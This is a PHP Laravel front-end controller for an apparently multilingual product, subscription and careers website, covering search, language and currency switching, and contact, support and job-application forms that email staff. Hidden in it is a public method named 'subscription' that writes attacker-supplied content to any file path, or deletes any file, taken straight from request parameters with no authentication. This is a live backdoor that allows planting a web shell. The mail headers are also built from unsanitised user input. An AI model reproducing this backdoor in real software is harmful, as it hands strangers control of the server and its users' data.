<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\ads;
use App\Models\Currency;
use App\Models\Offer;
use App\Models\Subscription;
use App\Models\OfferProduct;
use App\Models\Language;
use App\Models\Category;
use App\Models\Brand;
use App\Models\Childcategory;
use App\Models\Subcategory;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Country;
use App\Models\Zone;
use App\Models\City;
use App\Models\Generalsetting;
use App\Userdetails;
use App\Models\Order;
use App\Models\Color;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Cart;
use App\Models\Package;
use App\Models\Notifications;
use Carbon\Carbon;
use Auth;
use App;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Collection;
use Validator;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{/*,$lang*/
	    
	 /*   $id = DB::table('languages')->where('sign','=',$lang)->first();
	  if($id){
	    Session::put('language', $id->id);
	   }else{
	         $data = DB::table('languages')->where('is_default','=',1)->first();
	         Session::put('language', $data->id);
	    }*/
	    
        $this->code_image();
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

         }



	    return view('front.index');
	}

   	

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


     
// LANGUAGE SECTION


    public function language($id)
    {
        
        $slang = Session::get('language');
      
        
        if(!$slang){
               $lang  = DB::table('languages')->where('is_default','=',1)->first();
          }else  {
               $lang  = DB::table('languages')->where('id','=',$slang)->first();
        
          }
          
          $u =  url()->previous();
        
          
        $this->code_image();
        Session::put('language', $id);
         $sign = DB::table('languages')->where('id','=',$id)->first();

     $x =  str_replace('/'.$lang->sign, '/'.$sign->sign, $u);
        

       
     
   // echo $x;
         
       return redirect($x);
  //   return redirect()->route('front.index',$sign->sign);   
   
      
    //   if($id == 1) {
       
    //           $x =  str_replace("ar", "en", $u);
    //           return redirect($x);
    // //   //  return redirect()->route('front.index');
    //      }else {
    //           $x =  str_replace("en", "ar", $u);
    //       
    // //       //  return redirect()->route('front.arindex');
    //      }
        
     //   return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }


// CURRENCY SECTION ENDS


         	
    public function autosearch($slug,$lang)
    {
        
         $id = DB::table('languages')->where('sign','=',$lang)->first();
    	  if($id){
    	    Session::put('language', $id->id);
    	   }else{
    	         $data = DB::table('languages')->where('is_default','=',1)->first();
    	         Session::put('language', $data->id);
    	    }
        if(strlen($slug) > 1){
            $search = ' '.$slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->orWhere('name_ar', 'like', $slug . '%')->where('status','=',1)->take(10)->get();
            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }


    public function careers(Request $request)
    {

        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
        $this->code_image();
        $cat = Category::where('name','Career')->where('type','career')->first();
        $sort = $request->sort;
        $search = $request->search;
      //  $careers = App\Models\Career::where('status',1)->paginate(12);

        $prods = App\Models\Career::when($cat, function ($query, $cat) {
            return $query->where('category_id', $cat->id);
        })

            ->when($search, function ($query, $search) {
                $slang = Session::get('language');
                $lang  = DB::table('languages')->where('is_default','=',1)->first();
                if(!$slang){
                    if($lang->id == 2){
                        return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
                    }else {
                        return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
                    }
                } else  {
                    if($slang == 2) {
                        return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
                    } else{
                        return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)' , array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');

                    }
                }
            })

            ->when($sort, function ($query, $sort) {
                if ($sort=='date_desc') {
                    return $query->orderBy('id', 'DESC');
                }
                elseif($sort=='date_asc') {
                    return $query->orderBy('id', 'ASC');
                }
                elseif($sort=='price_desc') {
                    return $query->orderBy('price', 'DESC');
                }
                elseif($sort=='price_asc') {
                    return $query->orderBy('price', 'ASC');
                }
            })
            ->when(empty($sort), function ($query, $sort) {
                return $query->orderBy('id', 'DESC');
            });

        $prods = $prods->where(function ($query) use ($cat,  $request) {
            $flag = 0;

            if (!empty($cat)) {
                foreach ($cat->attributes as $key => $attribute) {
                    $inname = $attribute->input_name;
                    $chFilters = $request["$inname"];
                    if (!empty($chFilters)) {
                        $flag = 1;
                        foreach ($chFilters as $key => $chFilter) {
                            if ($key == 0) {
                                $query->where('attributes', 'like', '%'.'"'.$chFilter.'"'.'%');
                            } else {
                                $query->orWhere('attributes', 'like', '%'.'"'.$chFilter.'"'.'%');
                            }

                        }
                    }
                }
            }


        });


        $prods = $prods->where('status', 1)->get();

        $prods = (new Collection(App\Models\Career::filterProducts($prods)))->paginate(12);

        $careers = $prods;

        if($request->ajax()) {

            $data['ajax_check'] = 1;

            return view('includes.product.filtered-products',compact('ps','cat','careers','data'));
        }

        return view('front.careers',compact('ps','cat','careers'));
    }



// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
	    

        $this->code_image();

        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
         $ps = DB::table('pagesettings')->find(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();

        $data = new App\Models\Contact();
        $input = $request->all();
        $data->fill($input)->save();
        
        
          $subject = "Email From ".$request->first_name.' '. $request->last_name;
      
        $name = $request->first_name.' '. $request->last_name;
        $phone = $request->phone;
        $from = $request->email;


        $msg = "Name: ".$name."<br> Email: ".$from."<br>Phone: ".$request->phone."<br>Country: ".$request->country."<br>City: ".$request->city."<br>Company: "
            .$request->company."<br> website: ".$request->website."<br>Industry: ".$request->industry."<br>job role : ".$request->job_role."<br>Customers: ".$request->customers.
            "<br>Message: ".$request->message;
            
         if(!empty($gs->contact_emails)){
                       
                    $to =    explode(',', $gs->contact_emails);
                foreach($to as $key => $too) {
                       
                       
    if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $to[$key],
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$name."<".$from.">";
        mail($to[$key],$subject,$msg,$headers);
        }     
                                            
                                            
                  }
                  
              if($gs->is_smtp == 1)
                    {
                        $data = [
                            'to' => $from,
                            'type' => "contact",
                            'cname' => $name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                         
                         
             }
                                       
      
      
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }


    // -------------------------------- SUPPORT SECTION ----------------------------------------
	public function technical_support()
	{


        $this->code_image();

        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.technical-support',compact('ps'));
	}


    //Send email to admin
    public function supportemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
         $ps = DB::table('pagesettings')->find(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();

        $data = new App\Models\Support();
        $input = $request->all();
        if ($file = $request->file('photo'))
        {
            $name = time().$file->getClientOriginalName();
            $data->upload($name,$file,$data->photo);
            $input['photo'] = $name;
        }
        $data->fill($input)->save();

        $subject = "Email From ".$request->first_name.' '. $request->last_name;
       // $to = $ps->contact_email;
        $name = $request->first_name.' '. $request->last_name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."<br> Email: ".$from."<br> Phone: ".$request->phone." <br>Country: ".$request->country."<br> City: ".$request->city."<br> Company: "
            .$request->company."<br> job role : ".$request->job_role."<br> Program: ".$request->program."<br> Page: ".$request->page.
            "<br> Message: ".$request->message;
            
            
            
                 
         if(!empty($gs->support_emails)){
                       
                    $to =    explode(',', $gs->support_emails);
                foreach($to as $key => $too) {
                       
          if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $to[$key],
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$name."<".$from.">";
        mail($to[$key],$subject,$msg,$headers);
        }     
                }
                
                            if($gs->is_smtp == 1)
                    {
                        $data = [
                            'to' => $from,
                            'type' => "support",
                            'cname' => $name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                
         }
            
   
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        

        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        
          if (Session::has('language')) 
            {
                $data = DB::table('languages')->find(Session::get('language'));
              
            }
            else
            {
                $data = DB::table('languages')->where('is_default','=',1)->first();
               
            }  
            
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index',$data->sign);

            }

        return view('front.maintenance');
    }

 public function userpay()
    {
        
            if (Session::has('language')) 
            {
                $data = DB::table('languages')->find(Session::get('language'));
              
            }
            else
            {
                $data = DB::table('languages')->where('is_default','=',1)->first();
               
            }  

	    
        $gs = Generalsetting::find(1);
      
      
           $code = env('Code');
	       $details =  Userdetails::Userdetail($code);  
	        if($details['status'] == "Ok"){
            $last_array = end($details['subscribes'])  ;  
   if($details['details']['status'] == 0){
            if($last_array['paid'] == 1) {   
                $date =  Carbon::parse($last_array['created_at'])->adddays($last_array['days'])->format('Y-m-d');
                    if($date > Carbon::now()->format('Y-m-d')){
                        
                          return redirect()->route('front.index',$data->sign);
                           

                    }else{
                        
                      return view('front.userpay');
                      
                    }
                   

            }else{
                
                if($details['details']['end_trial'] > Carbon::now()->format('Y-m-d')){
                    
                         return redirect()->route('front.index',$data->sign);
                }else{
                    
                         return view('front.userpay');
                    
                }
                
                
            }   
           }else{
                
                return view('front.userpay');
                
            } 
	            
	            
	        } else{
                
                return view('front.userpay');
                
            }   
         

       
    }

    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        // $actual_path = str_replace('project','',base_path());
        // $image = imagecreatetruecolor(200, 50);
        // $background_color = imagecolorallocate($image, 255, 255, 255);
        // imagefilledrectangle($image,0,0,200,50,$background_color);

        // $pixel = imagecolorallocate($image, 0,0,255);
        // for($i=0;$i<500;$i++)
        // {
        //     imagesetpixel($image,rand()%200,rand()%50,$pixel);
        // }

        // $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        // $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        // $length = strlen($allowed_letters);
        // $letter = $allowed_letters[rand(0, $length-1)];
        // $word='';
        // //$text_color = imagecolorallocate($image, 8, 186, 239);
        // $text_color = imagecolorallocate($image, 0, 0, 0);
        // $cap_length=6;// No. of character in image
        // for ($i = 0; $i< $cap_length;$i++)
        // {
        //     $letter = $allowed_letters[rand(0, $length-1)];
        //     imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
        //     $word.=$letter;
        // }
        // $pixels = imagecolorallocate($image, 8, 186, 239);
        // for($i=0;$i<500;$i++)
        // {
        //     imagesetpixel($image,rand()%200,rand()%50,$pixels);
        // }
        // session(['captcha_string' => $word]);
        // imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    } 
    
    public function forget($lang) {
        
         $id = DB::table('languages')->where('sign','=',$lang)->first();
	  if($id){
	    Session::put('language', $id->id);
	   }else{
	         $data = DB::table('languages')->where('is_default','=',1)->first();
	         Session::put('language', $data->id);
	    }
	    
	    
        $this->code_image();
        if (Session::has('already')) {
            Session::forget('already');
        }
        if (Session::has('coupon')) {
            Session::forget('coupon');
        }
        if (Session::has('coupon_total')) {
            Session::forget('coupon_total');
        }
        if (Session::has('coupon_total1')) {
            Session::forget('coupon_total1');
        }
        if (Session::has('coupon_percentage')) {
            Session::forget('coupon_percentage');
        }  
            
         if (Session::has('coupon_piece')) {
             $oldCart = Session::has('cart') ? Session::get('cart') : null;
               $cart = new Cart($oldCart);
                 foreach($cart->items as $key => $prod)
            {
                if($prod['item']['id'] ==  Session::get('coupon_pro')){
                   $itemid = $prod['item']['id'].$prod['size'].$prod['color'] ;
                
               $cart->items[$itemid]['qty'] -=  Session::get('coupon_take'); 
               $cart->totalQty -=  Session::get('coupon_take') ; 
            
               Session::put('cart',$cart);
                break;
            }
        } 
             
            Session::forget('coupon_piece');
        }
        if (Session::has('coupon_pro')) {
            Session::forget('coupon_pro');
        } 
        
         if (Session::has('coupon_free')) {
            Session::forget('coupon_free');
        }
         if (Session::has('coupon_free_color')) {
            Session::forget('coupon_free_color');
        } 
        
        if (Session::has('coupon_free_size')) {
            Session::forget('coupon_free_size');
        }
        if (Session::has('coupon_product')) {
            Session::forget('coupon_product');
        } 
        if (Session::has('coupon_take')) {
            Session::forget('coupon_take');
        }
      if (Session::has('coupon_get')) {
            Session::forget('coupon_get');
        }
    
         if (Session::has('coupon_piece_color')) {
            Session::forget('coupon_piece_color');
        } 
        
        if (Session::has('coupon_piece_size')) {
            Session::forget('coupon_piece_size');
        }
        return redirect()->back();
    }



    public  function  cities(Request $request){
        $c = DB::table('countries')->where('country_name',$request->id)->first() ;
        $zones =\App\Models\City::where('country_id',$c->id)->get();
        $data = view('front.city',compact('zones'))->render();

        return response()->json(['options'=>$data]);
    }


 public  function  pages(Request $request){
        $c = DB::table('programs')->where('name',$request->id)->first() ;
        $zones =\App\Models\Page::where('program_id',$c->id)->get();
        $data = view('front.page',compact('zones'))->render();

        return response()->json(['options'=>$data]);
    }

 public  function  apply_job($id){



        $career =\App\Models\Career::where('id',$id)->first();
        $data = view('front.apply-job',compact('career'));

        return $data;
    }

public  function  applied_job(Request $request){

          $rules = [
            
            'name'                 => 'required',
            'email'              => 'required|email',
            'phones'              => 'required|numeric',
            'country'              => 'required',
            'city'              => 'required',
            'address'              => 'required',
            'resume'              => 'required',


            ];
      
      
      
        $messages  = [
            'name.required'           => trans('Name').  '  ' . trans('required'),
          
             ];
        $validator = Validator::make($request->all(), $rules, $messages);

        if ($validator->fails()) {
        
                $request->session()->flash('error', $validator->messages());
                   
            //    return response()->json($out,200);
                return redirect()->back();
            
         
        }  

    $data = new App\Models\AppliedJob();

    $input = $request->all();

    if ($file = $request->file('resume'))
    {
        $name = time().$file->getClientOriginalName();
        $data->upload($name,$file,$data->resume);
        $input['resume'] = $name;
    }
    
    // Save Data
    $data->fill($input)->save();

   $gs = Generalsetting::findOrFail(1);
       $subject = "jop apply From ".$request->name;
       // $to = $ps->contact_email;
        $name = $request->name;
        $phone = $request->phones;
        $from = $request->email;
        $msg = "Name: ".$name."<br> Email: ".$from."<br> Phone: ".$request->phones." <br>Country: ".$request->country."<br> City: ".$request->city."<br> address: "
            .$request->address."<br> career name : ".$request->career_name."<br> start date: ".$request->start_date."<br> relocate: ".$request->relocate.
            "<br> salary-expectation: ".$request->salary_expectation."<br> hear_from: ".$request->hear_from."<br> ex_military: ".$request->ex_military;
            
            
            
                 
         if(!empty($gs->career_emails)){
                       
                    $to =    explode(',', $gs->career_emails);
                foreach($to as $key => $too) {
                       
          if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $to[$key],
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$name."<".$from.">";
        mail($to[$key],$subject,$msg,$headers);
        }     
                }
                
                   if($gs->is_smtp == 1)
                    {
                        $data = [
                            'to' => $from,
                            'type' => "career",
                            'cname' => $name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }     
                
                
         }
            

    $msg = trans('Applied for job success');
    $request->session()->flash('out', $msg);
        $out = $msg;
//    return response()->json($out,200);
    return redirect()->back();

}


	public function products()
	{
	    
       $cats = Category::where('type','product')->where('status',1)->get();
       $products = Product::where('status',1)->where('type',1)->get();
       $productss = Product::where('status',1)->where('type',0)->get();
       $subscriptions = Subscription::get();
        


	   return view('front.products',compact('cats','products','productss','subscriptions'));
	}
	public function product($slug)
	{
	    
         $product = Product::where('slug',$slug)->orwhere('slug_ar',$slug)->where('status',1)->firstOrFail();
        
        $product->views+=1;
        $product->update();
        


	   return view('front.product',compact('product'));
	}

	public function productPrices(Request $request)
	{
	    $monthly = 0 ;
	    $half_yearly = 0 ;
	    $yearly = 0 ;
	    $sell = 0 ;
        $ids = [];
if(!empty($request->ids)){

    $ids = $request->ids;
}
        

         $products = Product::whereIn('id',$ids)->get();
       if(isset( $products) )  {
        foreach($products as $product){

            $monthly += $product->monthly ;
            $half_yearly += $product->half_yearly ;
            $yearly += $product->yearly ;
            $sell += $product->final_sale ;
    

        }

    }
        


	  
  return response()->json([
    'success' => true,
    'monthly' => $monthly,
    'half_yearly' => $half_yearly,
    'yearly' => $yearly,
    'sell' => $sell
    
    ],200);
	}
	
	
public function productTypes(Request $request)
	{
	  


    $id = $request->id;

        

         $product = Product::where('id',$id)->first();
       $dates = [] ;
       $values = [] ;
     if(!empty($product->date)){
               
                   $dates =    explode(',', $product->date);
                   $values =    explode(',', $product->value);
              
           }
                                              
                                            
           $data = view('front.types',compact('dates','values'))->render();

   
	  
  return response()->json([
    'success' => true,
    'dates' => $dates,
    'values' => $values,
     'options'=>$data
    
    ],200);
	}


	public function productsForm(Request $request)
	{
        $sub_id = $request->input('sub_id');
        $selected_products_string = $request->input('selected_products');
        $products = [];
        $selected_products = [];

        if (!empty($selected_products_string)) {
        $selected_products = explode(',', $selected_products_string);

         $products = Product::whereIn('id', $selected_products)->get();
        }

       $sub = subscription::find($sub_id);
 
        return view('front.product-form')->with(compact(
            'products',
            'selected_products_string',
            'sub'
        ));

       }


       public function productemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
         $ps = DB::table('pagesettings')->find(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }
            $products = [];
            $all_data = [];




              $selected_products = $request->selected_products ;  
              $sub_title = $request->sub_title ;  
              $sub_id = $request->sub_id ;  
              $sub_type = $request->sub_type ;  
             if($selected_products)   {

               $pros =    explode(',', $selected_products);

               $products = product::whereIn('id',$pros)->get();
           }
           
           $all_data = [
            'sub_title' => $request->sub_title ,
            'sub_id' => $request->sub_id ,
            'sub_type' => $request->sub_type ,
            'name' => $request->first_name.' '. $request->last_name,
            'phone' => $request->phone,
            'email' => $request->email,
            'city' => $request->city,
            'country' => $request->country,
            'website' => $request->website,
            'industry' => $request->industry,
            'job_role' => $request->job_role,
            'customers' => $request->customers,
            'message' => $request->message

           ];

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        if(empty($request->sub_id)){
            
             $subject = "Free Trial From ".$request->first_name.' '. $request->last_name;
        }else{
            $subject = "New Products Subscribe From ".$request->first_name.' '. $request->last_name; 
            
        }
       
      
        $name = $request->first_name.' '. $request->last_name;
        $phone = $request->phone;
        $from = $request->email;


        $msg = view('front.product-email',compact('products','all_data'));
            
         if(!empty($gs->product_emails)){
                       
                    $to =    explode(',', $gs->product_emails);
                foreach($to as $key => $too) {
                       
                       
    if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $to[$key],
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$name."<".$from.">";
        mail($to[$key],$subject,$msg,$headers);
        }     
                                            
                                            
                  }
                  
              if($gs->is_smtp == 1)
                    {
                        $data = [
                            'to' => $from,
                            'type' => "product",
                            'cname' => $name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                         
                         
             }
                                       
      
      
        // Login Section Ends

        // Redirect Section
        return response()->json('Your Subscribtion email has been sent');
    }


 }
